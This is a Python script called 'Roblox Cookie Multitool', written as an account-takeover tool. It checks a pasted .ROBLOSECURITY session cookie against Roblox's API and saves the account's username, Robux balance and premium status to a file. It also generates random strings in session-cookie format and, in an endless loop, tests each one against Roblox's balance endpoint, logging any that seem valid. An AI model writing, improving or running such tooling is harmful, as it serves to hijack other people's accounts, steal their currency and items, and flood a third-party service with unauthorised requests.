try:
    import os
    from os import system
    system("title " + "Roblox Cookie Multitool")
except:
    pass
import colorama, random, requests
colorama.init()
def cookie_checker():
	cookie = input("Enter Roblox Cookie: ")
	try:
		r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
		print("Cookie Is Valid")
		try:
			print("Acount User Id: " +  str(r["UserID"]))
		except Exception:
			print("Acount User Id: ERROR")
		try:
			print("Acount Username: " +  str(r["UserName"]))
		except Exception:
			print("Acount Username: ERROR")
		try:	
			print("Robux Balance: " +  str(r["RobuxBalance"]))
		except Exception:
			print("Robux Balance: ERROR")
		try:	
			print("Account Picture: " +  str(r["ThumbnailUrl"]))
		except Exception:
			print("Account Picture: ERROR")
		try:	
			print("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]))
		except Exception:
			print("Builders Club Member: ERROR")
		try:	
			print("Premium: " +  str(r["IsPremium"]))
		except Exception:
			print("Premium: ERROR")
		while True:
			save = input("Wanna Save Info In A Txt File (y/n): ")
			if save == "y" or save == "n":
				break
			else:
				print("Enter A Valid Choice")
		if save == "y":
			file = open(str(r["UserName"])+".txt", "a")
			try:
				file.write("Acount User Id: " +  str(r["UserID"]) + "\n")
			except Exception:
				file.write("Acount User Id: ERROR" + "\n")
			try:
				file.write("Acount Username: " +  str(r["UserName"]) + "\n")
			except Exception:
				file.write("Acount Username: ERROR" + "\n")
			try:	
				file.write("Robux Balance: " +  str(r["RobuxBalance"]) + "\n")
			except Exception:
				file.write("Robux Balance: ERROR" + "\n")
			try:	
				file.write("Account Picture: " +  str(r["ThumbnailUrl"]) + "\n")
			except Exception:
				file.write("Account Picture: ERROR" + "\n")
			try:	
				file.write("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]) + "\n")
			except Exception:
				file.write("Builders Club Member: ERROR" + "\n")
			try:	
				file.write("Premium: " +  str(r["IsPremium"]) + "\n")
			except Exception:
				file.write("Premium: ERROR" + "\n")
			file.close()
			print("Succsesfully Saved")
			input("")
	except Exception:
		print("Cookie Invalid")
		input("")
def cookie_gen():
	while True:
		try:
			main = input("Enter How Many Cookies You Wanna Generate: ")
			main = int(main)
			main = str(main)
			break
		except Exception:
			print("Enter A Valid Choice")
	print("Generating, Please Be Patient")
	limit = int(main)
	done = 0
	choices = "ABCDEF123456789"
	while True:
		numba1 = random.choices(choices, k=732)
		file = open("cookie.txt", "a")
		file.write("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
		file.write(''.join(numba1))
		file = open("cookie.txt", "a")
		file.write("\n")
		file.close()
		done = int(done) + 1
		print(f"{done} Cookie(s) Have Been Generated")
		if done == limit:
			print("Done")
			input("")
			return
def cookie_gen_checker():
	while True:
		save = input("Auto Save (y/n): ")
		if save == "y" or save == "n":
			break
		else:
			print("Enter A Valid Choice")
	choices = "ABCDEF123456789"
	while True:
		numba1 = random.choices(choices, k=732)
		cookie_to_check = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + ''.join(numba1)
		("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
		r2 = requests.get("https://api.roblox.com/currency/balance", cookies={".ROBLOSECURITY": str(cookie_to_check)})
		r2 = str(r2)
		if "200" in r2:
			print("Cookie Valid: " + str(cookie_to_check))
			if save == "y":
				file = open("valid_cookies.txt", "a")
				file.write(cookie_to_check + "\n")
				file.close()
		if "200" not in r2:
			print("Cookie Invalid: " + cookie_to_check)
			if save == "y":
				file2 = open("invalid_cookies.txt", "a")
				file2.write(cookie_to_check + "\n")
				file2.close()		
while True:
    print(colorama.Fore.CYAN + """
    _________                __   .__               
    \_   ___ \  ____   ____ |  | _|__| ____         
    /    \  \/ /  _ \ /  _ \|  |/ /  |/ __ \        
    \     \___(  <_> |  <_> )    <|  \  ___/        
    \______  /\____/ \____/|__|_ \__|\___  >       
            \/                   \/       \/        
    _____        .__   __  .__  __         .__   
    /     \  __ __|  |_/  |_|__|/  |_  ____ |  |  
    /  \ /  \|  |  \  |\   __\  \   __\/  _ \|  |  
    /    Y    \  |  /  |_|  | |  ||  | (  <_> )  |__
    \____|__  /____/|____/__| |__||__|  \____/|____/
            \/                                      
            MADE BY blob#0005""")
    print(colorama.Fore.CYAN + """
    1. Singular Cookie Checker
    2. Cookie Generator
    3. Cookie Generator And Auto Check""")
    main = input("> ")
    if main == "1":
        cookie_checker()
    if main == "2":
        cookie_gen()
    if main == "3":
        cookie_gen_checker()
